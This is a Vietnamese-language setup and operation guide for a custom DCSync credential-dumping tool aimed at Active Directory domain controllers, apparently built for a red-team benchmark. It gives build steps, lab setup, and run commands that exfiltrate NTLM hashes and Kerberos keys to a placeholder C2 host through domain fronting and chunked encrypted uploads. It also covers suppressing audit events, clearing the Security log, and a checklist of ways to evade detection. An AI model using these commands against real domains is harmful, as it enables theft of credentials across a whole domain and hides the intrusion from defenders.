# Plan 3 — DCSync via DRSUAPI: Hướng dẫn Setup & Chạy thử

> **Target**: T1003.006 — DCSync (Domain Controller Sync)
> **Phương pháp**: DRSUAPI DsGetNCChanges + Chunked HTTPS Exfiltration + Domain Fronting
> **Yêu cầu**: Domain Admin hoặc Replicate Directory Changes privilege (đã leo quyền thành công)

---

## 1. Yêu cầu môi trường

| Thành phần | Yêu cầu |
|------------|---------|
| **OS (attacker)** | Windows 10/11 hoặc Windows Server (domain-joined) |
| **OS (target)** | Windows Server 2016/2019/2022 Domain Controller |
| **Domain** | Active Directory domain (functional level 2016+) |
| **Quyền tối thiểu** | Replicate Directory Changes (CN=Configuration,DC=...) |
| **Quyền khuyến nghị** | Domain Admin hoặc Enterprise Admin |
| **Network** | Kết nối TCP đến DC (port 135 + dynamic RPC port 49152-65535) |
| **C2 Server** | (Tùy chọn) HTTPS server để nhận exfil data |
| **Compiler** | Visual Studio 2022 + Windows SDK 10.0.22621+ |
| **Python** | 3.8+ (cho verify script) |

## 2. Cài đặt môi trường build

### 2.1 Visual Studio 2022

```powershell
winget install Microsoft.VisualStudio.2022.BuildTools --override `
    "--add Microsoft.VisualStudio.Workload.VCTools `
     --add Microsoft.VisualStudio.Component.Windows11SDK.22621 `
     --includeRecommended"
```

### 2.2 Kiểm tra thư viện bổ sung

```powershell
# Đảm bảo các thư viện sau có mặt:
# - rpcrt4.lib (Windows SDK)
# - netapi32.lib (Windows SDK)
# - winhttp.lib (Windows SDK)
# - crypt32.lib (Windows SDK)
# - ws2_32.lib (Windows SDK)

# Tất cả đều có sẵn trong Windows SDK, không cần cài thêm.
```

---

## 3. Build

### 3.1 Build tự động

```powershell
cd D:\2026\Benchmark_Q3\Prvention\OS_dump\Plan3_DCSync
.\build.bat
```

Output: `DCSyncTool.exe`

### 3.2 Build thủ công

```powershell
& "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

cl.exe /nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 `
    /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE" `
    /Fe"DCSyncTool.exe" `
    src\main.c src\drsuapi_bind.c src\dcsync_request.c `
    src\entinf_parser.c src\cred_extractor.c src\kerberos_decoder.c `
    src\audit_control.c src\exfil_c2.c `
    src\crypto\sha256.c src\crypto\aes256_gcm.c src\crypto\rsa.c `
    /link /NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT `
    ntdll.lib kernel32.lib advapi32.lib netapi32.lib rpcrt4.lib `
    crypt32.lib winhttp.lib ws2_32.lib
```

---

## 4. Setup môi trường test

### 4.1 Setup Domain Controller (Lab)

```powershell
# Trên DC (Windows Server 2022):
# 1. Cài đặt AD DS role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# 2. Promote thành DC
Install-ADDSForest -DomainName "testlab.local" -SafeModeAdministratorPassword `
    (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) -Force

# 3. Tạo test users
for ($i = 1; $i -le 20; $i++) {
    $pass = ConvertTo-SecureString "TestP@ss$i!" -AsPlainText -Force
    New-ADUser -Name "TestUser$i" -SamAccountName "testuser$i" `
        -UserPrincipalName "testuser$i@testlab.local" `
        -AccountPassword $pass -Enabled $true -Path "CN=Users,DC=testlab,DC=local"
}

# 4. Tạo service account với AES256 key
New-ADUser -Name "SvcAccount" -SamAccountName "svc_account" `
    -AccountPassword (ConvertTo-SecureString "SvcP@ssw0rd!" -AsPlainText -Force) `
    -Enabled $true -KerberosEncryptionType AES256

# 5. Thêm computer accounts
# (Tự động khi join domain từ workstation)
```

### 4.2 Cấp quyền DCSync

```powershell
# Trên DC, cấp Replicate Directory Changes cho user test:
# Cách 1: Thêm vào Domain Admins
Add-ADGroupMember -Identity "Domain Admins" -Members "testuser1"

# Cách 2: Cấp quyền cụ thể (ít ồn hơn)
dsacls "DC=testlab,DC=local" /G "TESTLAB\testuser2:CA;Replicating Directory Changes"
dsacls "DC=testlab,DC=local" /G "TESTLAB\testuser2:CA;Replicating Directory Changes All"

# Kiểm tra quyền:
dsacls "DC=testlab,DC=local"
```

### 4.3 Kiểm tra kết nối RPC

```powershell
# Test RPC endpoint mapper
Test-NetConnection -ComputerName "DC01.testlab.local" -Port 135

# Kiểm tra RPC services
sc.exe \\DC01.testlab.local query RpcSs
sc.exe \\DC01.testlab.local query RpcEptMapper
```

### 4.4 Setup C2 Server (tùy chọn)

```powershell
# Trên C2 server (Linux):
# Tạo HTTPS endpoint đơn giản với nginx hoặc Python

# Python C2 server đơn giản:
# python3 -c "
# from http.server import HTTPServer, BaseHTTPRequestHandler
# import ssl
# class C2(BaseHTTPRequestHandler):
#     def do_POST(self):
#         length = int(self.headers['Content-Length'])
#         data = self.rfile.read(length)
#         print(f'[RECV] {len(data)} bytes')
#         self.send_response(200)
#         self.end_headers()
#         self.wfile.write(b'{\"status\":\"ok\"}')
# ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
# ctx.load_cert_chain('server.crt', 'server.key')
# srv = HTTPServer(('0.0.0.0', 443), C2)
# srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
# print('[C2] Listening on :443')
# srv.serve_forever()"
```

---

## 5. Chạy thử

### 5.1 Chạy DCSync từ remote machine (DA)

```powershell
# Trên workstation domain-joined, chạy với DA account:
.\DCSyncTool.exe --dcsync testlab.local --output-json --disable-audit

# Hoặc chỉ định DC cụ thể:
.\DCSyncTool.exe --dcsync testlab.local --dc DC01.testlab.local --output-json
```

Output mong đợi:
```
┌──────────────────────────────────────────────────────────┐
│  DCSync Tool — T1003.006                                  │
│  Method: DRSUAPI DsGetNCChanges + Chunked HTTPS Exfil     │
│  Pre-condition: Domain Admin / Replicate Directory Changes │
└──────────────────────────────────────────────────────────┘

[*] Domain: testlab.local
[1/8] Target DC: DC01.testlab.local
[2/8] Authenticating (current credentials)... OK
[3/8] Audit policy: UNCHANGED
[4/8] Binding to DRSUAPI RPC... OK
[5/8] Getting domain naming context... DC=testlab,DC=local
[6/8] Starting DCSync replication...
      Cycle 1: 25 objects (total: 25)
      Cycle 2: 3 objects (total: 28)
      Total: 28 objects | Users: 22 | Computers: 4
[7/8] Serializing output... 24576 bytes
[8/8] No C2 URL — output held in memory only

[+] DCSync complete. 22 users, 4 computers extracted.
```

### 5.2 DCSync local (SYSTEM trên DC)

```powershell
# Trên chính DC, chạy dưới SYSTEM:
.\DCSyncTool.exe --dcsync-local --output-json --disable-audit
```

### 5.3 DCSync với C2 exfiltration

```powershell
# Gửi kết quả đến C2 server:
.\DCSyncTool.exe --dcsync testlab.local `
    --output-c2 "https://c2.example.com/telemetry/v1/events" `
    --front-domain "telemetry-events.office-cdn.com" `
    --chunk-size 4096 `
    --jitter-min 500 --jitter-max 3000 `
    --disable-audit
```

Output bổ sung:
```
[8/8] Exfiltrating via C2...
      Chunking 24576 bytes into 6 chunks (4096 bytes each)
      6 chunks sent to https://c2.example.com/telemetry/v1/events
```

### 5.4 Chế độ test giới hạn

```powershell
# Chỉ lấy 5 objects đầu tiên (test nhanh):
.\DCSyncTool.exe --dcsync testlab.local --max-objects 5 --output-json --no-exfil
```

### 5.5 List domains trong forest

```powershell
.\DCSyncTool.exe --list-domains
```

---

## 6. Verify kết quả

### 6.1 Parse JSON output (thủ công)

```powershell
# Nếu output lưu ra file:
.\DCSyncTool.exe --dcsync testlab.local --output-file dcsync_output.json --output-json

# Đọc và kiểm tra
$creds = Get-Content dcsync_output.json | ConvertFrom-Json
Write-Host "Users: $($creds.userCount)"
Write-Host "Computers: $($creds.computerCount)"
$creds.users | Select-Object samAccountName, rid, ntlmHash, enabled | Format-Table
```

### 6.2 So sánh với Mimikatz DCSync

```powershell
# Trên DC, chạy Mimikatz để cross-check:
# mimikatz # lsadump::dcsync /domain:testlab.local /user:Administrator

# So sánh NTLM hash với output của tool
```

### 6.3 Verify Kerberos keys

```powershell
# Kiểm tra Kerberos key types:
# Type 18 = AES256-CTS-HMAC-SHA1-96
# Type 17 = AES128-CTS-HMAC-SHA1-96
# Type 23 = RC4-HMAC (tương đương NTLM)
# Type 1  = DES-CBC-CRC (Windows 2000, đã deprecated)

# Verify trên DC:
Get-ADUser -Identity "testuser1" -Properties KerberosEncryptionType
```

### 6.4 Kiểm tra Event 4662

```powershell
# Sau khi chạy DCSync, kiểm tra audit log trên DC:
Get-WinEvent -LogName Security -MaxEvents 50 -ComputerName DC01 |
    Where-Object { $_.Id -eq 4662 }

# Nếu --disable-audit được dùng: không có event
# Nếu không: event 4662 với GUID {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
```

---

## 7. Chạy test script tự động

```powershell
cd test

# Test local (không C2):
.\run_test.ps1 -LocalOnly

# Test với C2:
.\run_test.ps1 -C2Url "https://c2.example.com/telemetry/v1/events"
```

---

## 8. Cleanup

```powershell
# Xóa output files
Remove-Item .\dcsync_output.json -Force -EA SilentlyContinue

# Xóa audit log traces (nếu có quyền trên DC)
# wevtutil cl Security  ← CẨN THẬN: xóa toàn bộ Security log!

# Restore audit policy (tự động bởi --disable-audit flag)
# Nếu manual:
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
```

---

## 9. Troubleshooting

| Lỗi | Nguyên nhân | Cách fix |
|-----|-------------|----------|
| `Failed to locate DC` | DNS không resolve được DC | Chỉ định DC bằng `--dc <hostname>` |
| `RpcStringBindingCompose failed: 1703` | RPC service không chạy | Kiểm tra `RpcSs` và `RpcEptMapper` services |
| `RpcBindingSetAuthInfo failed: 5` | Không có quyền truy cập | Chạy với DA account hoặc Replicate Directory Changes |
| `RPC exception: 0x6C6` | RPC endpoint không tìm thấy | Kiểm tra firewall rules; DC cần port 135 + dynamic RPC |
| `ERROR_ACCESS_DENIED (0x5)` | Không có quyền DCSync | Cần Replicate Directory Changes trên domain NC |
| `Cycle 1: 0 objects` | Không có object nào trong domain NC | Kiểm tra domain NC đúng không |
| `WinHttpSendRequest failed` | Không kết nối được C2 server | Kiểm tra URL, certificate, firewall |
| `Kerberos key count: 0` | supplementalCredentials rỗng hoặc parse lỗi | Kiểm tra AD functional level; user có Kerberos keys không |

---

## 10. Bypass Verification Checklist

- [ ] **Event 4662 Suppression**: Dùng `--disable-audit` → không có Event 4662 trong Security log
- [ ] **SIEM Correlation Evasion**: Chạy từ DC với SYSTEM account (legitimate replication context)
- [ ] **Network Traffic Blending**: DCSync RPC traffic giống hệt legitimate DC replication
- [ ] **C2 Domain Fronting**: Host header = Azure CDN, actual backend = C2 server
- [ ] **C2 Traffic Mimicry**: Office telemetry User-Agent + headers + JSON format
- [ ] **Chunked Exfil**: 4KB chunks với jitter 500-3000ms → không trigger volume anomaly
- [ ] **Process Creation Evasion**: Execute-assembly hoặc reflective DLL, không tạo process mới trên DC
- [ ] **Audit Policy Restore**: Audit policy được phục hồi sau khi DCSync hoàn tất
- [ ] **AES-256-GCM Encryption**: Mỗi chunk được mã hóa với session key riêng, nonce ngẫu nhiên

---

## 11. Kiến trúc triển khai C2

```
┌─────────────┐     ┌─────────────────┐     ┌──────────────┐
│ Attacker     │     │ Azure CDN        │     │ C2 Server     │
│ (DA account) │     │ (Front Domain)   │     │ (Real backend) │
├─────────────┤     ├─────────────────┤     ├──────────────┤
│ DCSyncTool  │────▶│ telemetry-events │────▶│ c2.example    │
│             │POST │ .office-cdn.com  │     │ .com          │
│ AES-GCM     │     │                  │     │               │
│ chunked JSON│     │ (SNI: front)     │     │ (Host: c2)    │
└─────────────┘     └─────────────────┘     └──────────────┘
                            │
                    Network monitor
                    chỉ thấy traffic
                    đến Microsoft CDN
```
